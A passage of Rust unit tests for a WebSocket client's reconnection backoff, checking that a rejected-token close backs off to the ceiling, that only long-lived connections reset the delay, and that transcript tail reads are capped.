        assert_eq!(server.await.unwrap(), 3, "keepalive pings went unanswered");
    }

    /// A rejected token must not turn into a hot loop.
    ///
    /// This is the bug the extraction exists to pin. Redstone answers an unknown
    /// or revoked token with a **1008 policy close**, which is a *clean* close —
    /// and the original loop reset the backoff on every clean close, so a
    /// revoked host would have redialled once a second, for ever, against a
    /// production server. Exactly the fail2ban-shaped failure this file's own
    /// documentation warns about.
    #[test]
    fn a_rejected_token_backs_all_the_way_off_rather_than_hammering() {
        let rejected: anyhow::Result<Option<u16>> = Ok(Some(REJECTED));

        // Instantly, and from the floor — the case that used to loop.
        assert_eq!(
            next_backoff(&rejected, Duration::from_millis(20), REDIAL_MIN),
            REDIAL_MAX,
            "a refused credential must go straight to the ceiling",
        );
        // …and it stays there however long the socket happened to be held open.
        assert_eq!(
            next_backoff(&rejected, Duration::from_secs(600), REDIAL_MIN),
            REDIAL_MAX,
        );
    }

    #[test]
    fn only_a_connection_that_lasted_resets_the_backoff() {
        let closed: anyhow::Result<Option<u16>> = Ok(None);
        let normal: anyhow::Result<Option<u16>> = Ok(Some(1000));

        // A server restart after a real session: come back quickly.
        assert_eq!(next_backoff(&closed, HEALTHY, Duration::from_secs(32)), REDIAL_MIN);
        assert_eq!(next_backoff(&normal, HEALTHY, Duration::from_secs(32)), REDIAL_MIN);

        // Accepted and dropped immediately, with a *normal* close code: grow.
        // This is the case that separates "lasted" from "ended politely".
        assert_eq!(
            next_backoff(&normal, Duration::from_millis(10), Duration::from_secs(2)),
            Duration::from_secs(4),
        );

        // The error path follows the same rule, and is capped.
        let failed: anyhow::Result<Option<u16>> = Err(anyhow::anyhow!("connection refused"));
        assert_eq!(
            next_backoff(&failed, Duration::from_millis(5), Duration::from_secs(40)),
            REDIAL_MAX,
        );
        assert_eq!(next_backoff(&failed, Duration::from_secs(90), REDIAL_MAX), REDIAL_MIN);
    }

    #[test]
    fn the_close_code_is_read_rather_than_bound() {
        // `Ok(Some(REJECTED))` reads as a pattern only because `REJECTED` is a
        // `const`. Had it been a local binding it would have matched *every*
        // close code and silently treated a routine disconnect as a rejection —
        // which looks identical in the logs and takes an hour to find.
        let normal: anyhow::Result<Option<u16>> = Ok(Some(1000));
        assert_ne!(
            next_backoff(&normal, Duration::from_millis(10), REDIAL_MIN),
            REDIAL_MAX,
            "1000 was treated as a rejection",
        );
    }

    #[test]
    fn the_tail_is_bounded_however_much_is_asked_for() {
        // A caller asking for the whole of a 228 MB transcript would otherwise
        // allocate it, on a machine doing real work.
        assert_eq!(u64::MAX.clamp(1, MAX_TAIL_BYTES), MAX_TAIL_BYTES);
        assert_eq!(0u64.clamp(1, MAX_TAIL_BYTES), 1);
    }
}
